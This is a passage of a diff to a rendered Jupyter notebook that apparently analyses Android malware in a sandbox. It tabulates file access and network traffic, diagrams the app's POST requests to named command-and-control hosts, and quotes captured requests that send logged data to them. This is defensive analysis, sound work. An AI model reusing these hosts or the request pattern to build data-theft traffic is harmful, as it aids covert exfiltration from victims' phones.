+<span class="n">timestamps</span> <span class="o">=</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">seconds</span><span class="o">=</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="nb">float</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">"utf-8"</span><span class="p">))))))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s1">'fdaccess'</span><span class="p">]</span><span class="o">.</span><span class="n">keys</span><span class="p">()]</span>
 
-<span class="c"># Create list of accessed files entries</span>
-<span class="n">accessed_files</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s">'fdaccess'</span><span class="p">]</span><span class="o">.</span><span class="n">items</span><span class="p">()]</span>
+<span class="c1"># Create list of accessed files entries</span>
+<span class="n">accessed_files</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s1">'fdaccess'</span><span class="p">]</span><span class="o">.</span><span class="n">items</span><span class="p">()]</span>
 
-<span class="c"># Create dataframe</span>
+<span class="c1"># Create dataframe</span>
 <span class="n">df_accessedfiles</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">DataFrame</span><span class="p">(</span><span class="n">accessed_files</span><span class="p">,</span> <span class="n">index</span><span class="o">=</span><span class="n">timestamps</span><span class="p">)</span>
 <span class="n">df_accessedfiles</span><span class="o">.</span><span class="n">sort</span><span class="p">(</span><span class="n">inplace</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">df_accessedfiles</span><span class="o">.</span><span class="n">index</span><span class="o">.</span><span class="n">name</span><span class="o">=</span><span class="s">'Timestamp'</span>
+<span class="n">df_accessedfiles</span><span class="o">.</span><span class="n">index</span><span class="o">.</span><span class="n">name</span><span class="o">=</span><span class="s1">'Timestamp'</span>
 
-<span class="c"># Unhexlify data</span>
-<span class="n">unhexed_data</span> <span class="o">=</span> <span class="p">[</span><span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">df_accessedfiles</span><span class="p">[</span><span class="s">'data'</span><span class="p">]]</span>
-<span class="n">df_accessedfiles</span><span class="p">[</span><span class="s">'rawdata'</span><span class="p">]</span> <span class="o">=</span> <span class="n">unhexed_data</span>
+<span class="c1"># Unhexlify data</span>
+<span class="n">unhexed_data</span> <span class="o">=</span> <span class="p">[</span><span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">df_accessedfiles</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]]</span>
+<span class="n">df_accessedfiles</span><span class="p">[</span><span class="s1">'rawdata'</span><span class="p">]</span> <span class="o">=</span> <span class="n">unhexed_data</span>
 
-<span class="n">df2table</span><span class="p">(</span><span class="n">df_accessedfiles</span><span class="p">[[</span><span class="s">'operation'</span><span class="p">,</span> <span class="s">'path'</span><span class="p">,</span> <span class="s">'rawdata'</span><span class="p">]]</span><span class="o">.</span><span class="n">reset_index</span><span class="p">())</span>
-<span class="c">#ipy_table.apply_theme('basic')</span>
-<span class="n">df_accessedfiles</span><span class="p">[[</span><span class="s">'operation'</span><span class="p">,</span> <span class="s">'path'</span><span class="p">,</span> <span class="s">'rawdata'</span><span class="p">]]</span><span class="o">.</span><span class="n">reset_index</span><span class="p">()</span>
+<span class="n">df2table</span><span class="p">(</span><span class="n">df_accessedfiles</span><span class="p">[[</span><span class="s1">'operation'</span><span class="p">,</span> <span class="s1">'path'</span><span class="p">,</span> <span class="s1">'rawdata'</span><span class="p">]]</span><span class="o">.</span><span class="n">reset_index</span><span class="p">())</span>
+<span class="c1">#ipy_table.apply_theme('basic')</span>
+<span class="n">df_accessedfiles</span><span class="p">[[</span><span class="s1">'operation'</span><span class="p">,</span> <span class="s1">'path'</span><span class="p">,</span> <span class="s1">'rawdata'</span><span class="p">]]</span><span class="o">.</span><span class="n">reset_index</span><span class="p">()</span>
 </pre></div>
 </div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
-<div class="output_area"><div class="prompt output_prompt">
-    Out[421]:</div>
-<div class="output_html rendered_html output_subarea output_pyout">
+<div class="output_area"><div class="prompt output_prompt">Out[421]:</div>
+<div class="output_html rendered_html output_subarea output_execute_result">
 <div style="max-height:1000px;max-width:1500px;overflow:auto;">
 <table border="1" class="table table-hover table-striped dataframe">
 <thead>
@@ -920,25 +911,23 @@ In [421]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [405]:
-</div>
-<div class="collapseheader box-flex1"><span style="font-weight: bold;">Expand Code</span>
-<div class="input_area box-flex1" style="display:none">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="c"># Convert timestamps to human readable time delta</span>
-<span class="n">timestamps</span> <span class="o">=</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">seconds</span><span class="o">=</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="nb">float</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">))))))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s">'opennet'</span><span class="p">]</span><span class="o">.</span><span class="n">keys</span><span class="p">()]</span>
+<div class="prompt input_prompt">In [405]:</div>
+<div class="collapseheader inner_cell"><span style="font-weight: bold;">Expand Code</span>
+<div class="input_area" style="display:none">
+<div class="highlight-ipynb"><pre class="ipynb"><span></span><span class="c1"># Convert timestamps to human readable time delta</span>
+<span class="n">timestamps</span> <span class="o">=</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">seconds</span><span class="o">=</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="nb">float</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">"utf-8"</span><span class="p">))))))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s1">'opennet'</span><span class="p">]</span><span class="o">.</span><span class="n">keys</span><span class="p">()]</span>
 
-<span class="c"># Create list of accessed files entries</span>
-<span class="n">open_net</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s">'opennet'</span><span class="p">]</span><span class="o">.</span><span class="n">items</span><span class="p">()]</span>
+<span class="c1"># Create list of accessed files entries</span>
+<span class="n">open_net</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s1">'opennet'</span><span class="p">]</span><span class="o">.</span><span class="n">items</span><span class="p">()]</span>
 
-<span class="c"># Create dataframe</span>
+<span class="c1"># Create dataframe</span>
 <span class="n">df_opennet</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">DataFrame</span><span class="p">(</span><span class="n">open_net</span><span class="p">,</span> <span class="n">index</span><span class="o">=</span><span class="n">timestamps</span><span class="p">)</span>
 <span class="n">df_opennet</span><span class="o">.</span><span class="n">sort</span><span class="p">(</span><span class="n">inplace</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">df_opennet</span><span class="o">.</span><span class="n">index</span><span class="o">.</span><span class="n">name</span><span class="o">=</span><span class="s">'Timestamp'</span>
+<span class="n">df_opennet</span><span class="o">.</span><span class="n">index</span><span class="o">.</span><span class="n">name</span><span class="o">=</span><span class="s1">'Timestamp'</span>
 
 
-<span class="c">#df2table(df_opennet)</span>
-<span class="c">#ipy_table.apply_theme('basic')</span>
+<span class="c1">#df2table(df_opennet)</span>
+<span class="c1">#ipy_table.apply_theme('basic')</span>
 <span class="n">df_opennet</span><span class="o">.</span><span class="n">reset_index</span><span class="p">()</span>
 </pre></div>
 </div>
@@ -946,9 +935,8 @@ In [405]:
 </div>
 <div class="output_wrapper">
 <div class="output">
-<div class="output_area"><div class="prompt output_prompt">
-    Out[405]:</div>
-<div class="output_html rendered_html output_subarea output_pyout">
+<div class="output_area"><div class="prompt output_prompt">Out[405]:</div>
+<div class="output_html rendered_html output_subarea output_execute_result">
 <div style="max-height:1000px;max-width:1500px;overflow:auto;">
 <table border="1" class="table table-hover table-striped dataframe">
 <thead>
@@ -1011,43 +999,40 @@ In [405]:
 </div>
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
-<p>Here you can have a look at the sent data. Again: The POST/GET requests are not fully complete. </p>
+<p>Here you can have a look at the sent data. Again: The POST/GET requests are not fully complete.</p>
 </div>
 </div>
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [404]:
-</div>
-<div class="collapseheader box-flex1"><span style="font-weight: bold;">Expand Code</span>
-<div class="input_area box-flex1" style="display:none">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="c"># Convert timestamps to human readable time delta</span>
-<span class="n">timestamps</span> <span class="o">=</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">seconds</span><span class="o">=</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="nb">float</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">))))))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s">'sendnet'</span><span class="p">]</span><span class="o">.</span><span class="n">keys</span><span class="p">()]</span>
-<span class="c"># Create list of accessed files entries</span>
-<span class="n">send_net</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s">'sendnet'</span><span class="p">]</span><span class="o">.</span><span class="n">items</span><span class="p">()]</span>
+<div class="prompt input_prompt">In [404]:</div>
+<div class="collapseheader inner_cell"><span style="font-weight: bold;">Expand Code</span>
+<div class="input_area" style="display:none">
+<div class="highlight-ipynb"><pre class="ipynb"><span></span><span class="c1"># Convert timestamps to human readable time delta</span>
+<span class="n">timestamps</span> <span class="o">=</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">seconds</span><span class="o">=</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="nb">float</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">"utf-8"</span><span class="p">))))))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s1">'sendnet'</span><span class="p">]</span><span class="o">.</span><span class="n">keys</span><span class="p">()]</span>
+<span class="c1"># Create list of accessed files entries</span>
+<span class="n">send_net</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s1">'sendnet'</span><span class="p">]</span><span class="o">.</span><span class="n">items</span><span class="p">()]</span>
 
-<span class="c"># Create dataframe</span>
+<span class="c1"># Create dataframe</span>
 <span class="n">df_sendnet</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">DataFrame</span><span class="p">(</span><span class="n">send_net</span><span class="p">,</span> <span class="n">index</span><span class="o">=</span><span class="n">timestamps</span><span class="p">)</span>
 <span class="n">df_sendnet</span><span class="o">.</span><span class="n">sort</span><span class="p">(</span><span class="n">inplace</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">df_sendnet</span><span class="o">.</span><span class="n">index</span><span class="o">.</span><span class="n">name</span><span class="o">=</span><span class="s">'Timestamp'</span>
+<span class="n">df_sendnet</span><span class="o">.</span><span class="n">index</span><span class="o">.</span><span class="n">name</span><span class="o">=</span><span class="s1">'Timestamp'</span>
 
-<span class="c"># Unhexlify data</span>
-<span class="n">unhexed_data</span> <span class="o">=</span> <span class="p">[</span><span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">df_sendnet</span><span class="p">[</span><span class="s">'data'</span><span class="p">]]</span>
-<span class="n">df_sendnet</span><span class="p">[</span><span class="s">'rawdata'</span><span class="p">]</span> <span class="o">=</span> <span class="n">unhexed_data</span>
+<span class="c1"># Unhexlify data</span>
+<span class="n">unhexed_data</span> <span class="o">=</span> <span class="p">[</span><span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">df_sendnet</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]]</span>
+<span class="n">df_sendnet</span><span class="p">[</span><span class="s1">'rawdata'</span><span class="p">]</span> <span class="o">=</span> <span class="n">unhexed_data</span>
 
-<span class="c">#df2table(df_sendnet[['desthost', 'destport', 'fd', 'operation', 'type', 'rawdata']])</span>
-<span class="c">#ipy_table.apply_theme('basic')</span>
-<span class="n">df_sendnet</span><span class="p">[[</span><span class="s">'desthost'</span><span class="p">,</span> <span class="s">'destport'</span><span class="p">,</span> <span class="s">'fd'</span><span class="p">,</span> <span class="s">'operation'</span><span class="p">,</span> <span class="s">'type'</span><span class="p">,</span> <span class="s">'rawdata'</span><span class="p">]]</span><span class="o">.</span><span class="n">reset_index</span><span class="p">()</span>
+<span class="c1">#df2table(df_sendnet[['desthost', 'destport', 'fd', 'operation', 'type', 'rawdata']])</span>
+<span class="c1">#ipy_table.apply_theme('basic')</span>
+<span class="n">df_sendnet</span><span class="p">[[</span><span class="s1">'desthost'</span><span class="p">,</span> <span class="s1">'destport'</span><span class="p">,</span> <span class="s1">'fd'</span><span class="p">,</span> <span class="s1">'operation'</span><span class="p">,</span> <span class="s1">'type'</span><span class="p">,</span> <span class="s1">'rawdata'</span><span class="p">]]</span><span class="o">.</span><span class="n">reset_index</span><span class="p">()</span>
 </pre></div>
 </div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
-<div class="output_area"><div class="prompt output_prompt">
-    Out[404]:</div>
-<div class="output_html rendered_html output_subarea output_pyout">
+<div class="output_area"><div class="prompt output_prompt">Out[404]:</div>
+<div class="output_html rendered_html output_subarea output_execute_result">
 <div style="max-height:1000px;max-width:1500px;overflow:auto;">
 <table border="1" class="table table-hover table-striped dataframe">
 <thead>
@@ -1122,38 +1107,35 @@ In [404]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [403]:
-</div>
-<div class="collapseheader box-flex1"><span style="font-weight: bold;">Expand Code</span>
-<div class="input_area box-flex1" style="display:none">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="c"># Convert timestamps to human readable time delta</span>
-<span class="n">timestamps</span> <span class="o">=</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">seconds</span><span class="o">=</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="nb">float</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">))))))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s">'recvnet'</span><span class="p">]</span><span class="o">.</span><span class="n">keys</span><span class="p">()]</span>
+<div class="prompt input_prompt">In [403]:</div>
+<div class="collapseheader inner_cell"><span style="font-weight: bold;">Expand Code</span>
+<div class="input_area" style="display:none">
+<div class="highlight-ipynb"><pre class="ipynb"><span></span><span class="c1"># Convert timestamps to human readable time delta</span>
+<span class="n">timestamps</span> <span class="o">=</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">seconds</span><span class="o">=</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="nb">float</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">"utf-8"</span><span class="p">))))))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s1">'recvnet'</span><span class="p">]</span><span class="o">.</span><span class="n">keys</span><span class="p">()]</span>
 
-<span class="c"># Create list of accessed files entries</span>
-<span class="n">recv_net</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s">'recvnet'</span><span class="p">]</span><span class="o">.</span><span class="n">items</span><span class="p">()]</span>
+<span class="c1"># Create list of accessed files entries</span>
+<span class="n">recv_net</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s1">'recvnet'</span><span class="p">]</span><span class="o">.</span><span class="n">items</span><span class="p">()]</span>
 
-<span class="c"># Create dataframe</span>
+<span class="c1"># Create dataframe</span>
 <span class="n">df_recvnet</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">DataFrame</span><span class="p">(</span><span class="n">recv_net</span><span class="p">,</span> <span class="n">index</span><span class="o">=</span><span class="n">timestamps</span><span class="p">)</span>
 <span class="n">df_recvnet</span><span class="o">.</span><span class="n">sort</span><span class="p">(</span><span class="n">inplace</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">df_recvnet</span><span class="o">.</span><span class="n">index</span><span class="o">.</span><span class="n">name</span><span class="o">=</span><span class="s">'Timestamp'</span>
+<span class="n">df_recvnet</span><span class="o">.</span><span class="n">index</span><span class="o">.</span><span class="n">name</span><span class="o">=</span><span class="s1">'Timestamp'</span>
 
-<span class="c"># Unhexlify data</span>
-<span class="n">unhexed_data</span> <span class="o">=</span> <span class="p">[</span><span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">df_recvnet</span><span class="p">[</span><span class="s">'data'</span><span class="p">]]</span>
-<span class="n">df_recvnet</span><span class="p">[</span><span class="s">'rawdata'</span><span class="p">]</span> <span class="o">=</span> <span class="n">unhexed_data</span>
+<span class="c1"># Unhexlify data</span>
+<span class="n">unhexed_data</span> <span class="o">=</span> <span class="p">[</span><span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">df_recvnet</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]]</span>
+<span class="n">df_recvnet</span><span class="p">[</span><span class="s1">'rawdata'</span><span class="p">]</span> <span class="o">=</span> <span class="n">unhexed_data</span>
 
-<span class="c">#df2table(df_recvnet[['host', 'port', 'type', 'rawdata']])</span>
-<span class="c">#ipy_table.apply_theme('basic')</span>
-<span class="n">df_recvnet</span><span class="p">[[</span><span class="s">'host'</span><span class="p">,</span> <span class="s">'port'</span><span class="p">,</span> <span class="s">'type'</span><span class="p">,</span> <span class="s">'rawdata'</span><span class="p">]]</span><span class="o">.</span><span class="n">reset_index</span><span class="p">()</span>
+<span class="c1">#df2table(df_recvnet[['host', 'port', 'type', 'rawdata']])</span>
+<span class="c1">#ipy_table.apply_theme('basic')</span>
+<span class="n">df_recvnet</span><span class="p">[[</span><span class="s1">'host'</span><span class="p">,</span> <span class="s1">'port'</span><span class="p">,</span> <span class="s1">'type'</span><span class="p">,</span> <span class="s1">'rawdata'</span><span class="p">]]</span><span class="o">.</span><span class="n">reset_index</span><span class="p">()</span>
 </pre></div>
 </div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
-<div class="output_area"><div class="prompt output_prompt">
-    Out[403]:</div>
-<div class="output_html rendered_html output_subarea output_pyout">
+<div class="output_area"><div class="prompt output_prompt">Out[403]:</div>
+<div class="output_html rendered_html output_subarea output_execute_result">
 <div style="max-height:1000px;max-width:1500px;overflow:auto;">
 <table border="1" class="table table-hover table-striped dataframe">
 <thead>
@@ -1253,28 +1235,26 @@ In [403]:
 </div>
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
-<p>Since I was not able to get the full contents of the POST/GET requests (and their equivalent responses), I had to rely on the information found <a href="http://www.apk-analyzer.net/analysis/646/3752/0/html">here</a>. Below is a short sequence diagramm describing the general process of the communication. Keep in mind that the sequence only tries to give you a short overview of the data exchange between the process and the webserver. </p>
+<p>Since I was not able to get the full contents of the POST/GET requests (and their equivalent responses), I had to rely on the information found <a href="http://www.apk-analyzer.net/analysis/646/3752/0/html">here</a>. Below is a short sequence diagramm describing the general process of the communication. Keep in mind that the sequence only tries to give you a short overview of the data exchange between the process and the webserver.</p>
 </div>
 </div>
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [73]:
-</div>
-<div class="collapseheader box-flex1"><span style="font-weight: bold;">Expand Code</span>
-<div class="input_area box-flex1" style="display:none">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">%%</span><span class="k">seqdiag</span>
-<span class="n">seqdiag</span> <span class="p">{</span>
-  <span class="n">application</span>  <span class="o">-&gt;</span> <span class="n">citroen</span><span class="o">-</span><span class="n">club</span><span class="o">.</span><span class="n">ch</span> <span class="p">[</span><span class="n">label</span> <span class="o">=</span> <span class="s">"POST /images/1.php HTTP/1.1"</span><span class="p">];</span>
-  <span class="n">application</span> <span class="o">&lt;--</span> <span class="n">citroen</span><span class="o">-</span><span class="n">club</span><span class="o">.</span><span class="n">ch</span> <span class="p">[</span><span class="n">label</span> <span class="o">=</span> <span class="s">"HTTP/1.1 406 Not Acceptable"</span><span class="p">,</span> <span class="n">leftnote</span><span class="o">=</span> <span class="s">""</span><span class="p">];</span>
-  <span class="n">application</span> <span class="o">--&gt;</span> <span class="n">best</span><span class="o">-</span><span class="n">invest</span><span class="o">-</span><span class="nb">int</span><span class="o">.</span><span class="n">com</span> <span class="p">[</span><span class="n">label</span> <span class="o">=</span> <span class="s">"POST /gallery/3.php HTTP/1.1"</span><span class="p">,</span> <span class="n">note</span> <span class="o">=</span> <span class="s">"POST data=U2ltU3RhdGUgPSBOT1QgUkVBRFkgCg%3D%3D%0A&amp;rid=25"</span><span class="p">];</span>
-  <span class="n">application</span> <span class="o">&lt;--</span> <span class="n">best</span><span class="o">-</span><span class="n">invest</span><span class="o">-</span><span class="nb">int</span><span class="o">.</span><span class="n">com</span> <span class="p">[</span><span class="n">label</span> <span class="o">=</span> <span class="s">"HTTP/1.1 403 Forbidden"</span><span class="p">];</span>
-  <span class="n">application</span> <span class="o">--&gt;</span> <span class="n">best</span><span class="o">-</span><span class="n">invest</span><span class="o">-</span><span class="nb">int</span><span class="o">.</span><span class="n">com</span> <span class="p">[</span><span class="n">label</span> <span class="o">=</span> <span class="s">"POST /gallery/4.php HTTP/1.1"</span><span class="p">,</span> <span class="n">note</span> <span class="o">=</span> <span class="s">"POST data=U2ltU3RhdGUgPSBOT1QgUkVBRFkgCg%3D%3D%0A&amp;LogCode=CONF&amp;LogText=Get+config+data+from+server"</span><span class="p">];</span>
-  <span class="n">application</span> <span class="o">&lt;--</span> <span class="n">best</span><span class="o">-</span><span class="n">invest</span><span class="o">-</span><span class="nb">int</span><span class="o">.</span><span class="n">com</span> <span class="p">[</span><span class="n">label</span> <span class="o">=</span> <span class="s">"HTTP/1.1 403 Forbidden"</span><span class="p">];</span>
-  <span class="n">application</span> <span class="o">--&gt;</span> <span class="n">best</span><span class="o">-</span><span class="n">invest</span><span class="o">-</span><span class="nb">int</span><span class="o">.</span><span class="n">com</span> <span class="p">[</span><span class="n">label</span> <span class="o">=</span> <span class="s">"POST /gallery/4.php HTTP/1.1"</span><span class="p">,</span> <span class="n">note</span> <span class="o">=</span> <span class="s">"POST data=U2ltU3RhdGUgPSBOT1QgUkVBRFkgCg%3D%3D%0A&amp;LogCode=DATA&amp;LogText=Send+data+to+server&amp;"</span><span class="p">];</span>
-  <span class="n">application</span> <span class="o">&lt;--</span> <span class="n">best</span><span class="o">-</span><span class="n">invest</span><span class="o">-</span><span class="nb">int</span><span class="o">.</span><span class="n">com</span> <span class="p">[</span><span class="n">label</span> <span class="o">=</span> <span class="s">"..."</span><span class="p">];</span>
-<span class="p">}</span>
+<div class="prompt input_prompt">In [73]:</div>
+<div class="collapseheader inner_cell"><span style="font-weight: bold;">Expand Code</span>
+<div class="input_area" style="display:none">
+<div class="highlight-ipynb"><pre class="ipynb"><span></span><span class="o">%%</span><span class="k">seqdiag</span>
+seqdiag {
+  application  -&gt; citroen-club.ch [label = "POST /images/1.php HTTP/1.1"];
+  application &lt;-- citroen-club.ch [label = "HTTP/1.1 406 Not Acceptable", leftnote= ""];
+  application --&gt; best-invest-int.com [label = "POST /gallery/3.php HTTP/1.1", note = "POST data=U2ltU3RhdGUgPSBOT1QgUkVBRFkgCg%3D%3D%0A&amp;rid=25"];
+  application &lt;-- best-invest-int.com [label = "HTTP/1.1 403 Forbidden"];
+  application --&gt; best-invest-int.com [label = "POST /gallery/4.php HTTP/1.1", note = "POST data=U2ltU3RhdGUgPSBOT1QgUkVBRFkgCg%3D%3D%0A&amp;LogCode=CONF&amp;LogText=Get+config+data+from+server"];
+  application &lt;-- best-invest-int.com [label = "HTTP/1.1 403 Forbidden"];
+  application --&gt; best-invest-int.com [label = "POST /gallery/4.php HTTP/1.1", note = "POST data=U2ltU3RhdGUgPSBOT1QgUkVBRFkgCg%3D%3D%0A&amp;LogCode=DATA&amp;LogText=Send+data+to+server&amp;"];
+  application &lt;-- best-invest-int.com [label = "..."];
+}
 </pre></div>
 </div>
 </div>
@@ -1689,8 +1669,8 @@ Connection: Keep-Alive
 Accept-Encoding: gzip
 Content-Length: 86
 Data Raw: 64 61 74 61 3d 55 32 6c 74 55 33 52 68 64 47 55 67 50 53 42 4f 54 31 51 67 55 6b 56 42 52 46 6b 67 43 67 25 33 44 25 33 44 25 30 41 26 4c 6f 67 43 6f 64 65 3d 43 4f 4e 46 26 4c 6f 67 54 65 78 74 3d 43 68 65 63 6b 2b 70 75 6c 6c 2b 6f 66 66 2b 75 72 6c 73 26 
-Data Ascii: data=U2ltU3RhdGUgPSBOT1QgUkVBRFkgCg%3D%3D%0A&amp;LogCode=CONF&amp;LogText=Check+pull+off+urls&amp;
-</code></pre><p><strong>Response</strong>:</p>
+Data Ascii: data=U2ltU3RhdGUgPSBOT1QgUkVBRFkgCg%3D%3D%0A&amp;LogCode=CONF&amp;LogText=Check+pull+off+urls&amp;</code></pre>
+<p><strong>Response</strong>:</p>
 <pre><code>HTTP/1.1 403 Forbidden
 Date: Thu, 21 Nov 2013 12:37:26 GMT
 Server: Apache/2.2.3 (CentOS)
@@ -1698,8 +1678,7 @@ Content-Length: 299
 Connection: close
 Content-Type: text/html; charset=iso-8859-1
 
-&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Forbidden&lt;/h1&gt;&lt;p&gt;You don't have permission to access /gallery/4.phpon this server.&lt;/p&gt;&lt;hr&gt;&lt;address&gt;Apache/2.2.3 (CentOS) Server at best-invest-int.com Port 80&lt;/address&gt;&lt;/body&gt;&lt;/html&gt;
-</code></pre>
+&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Forbidden&lt;/h1&gt;&lt;p&gt;You don't have permission to access /gallery/4.phpon this server.&lt;/p&gt;&lt;hr&gt;&lt;address&gt;Apache/2.2.3 (CentOS) Server at best-invest-int.com Port 80&lt;/address&gt;&lt;/body&gt;&lt;/html&gt;</code></pre>
 </div>
 </div>
 </div>
@@ -1714,27 +1693,25 @@ Content-Type: text/html; charset=iso-8859-1
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [417]:
-</div>
-<div class="collapseheader box-flex1"><span style="font-weight: bold;">Expand Code</span>
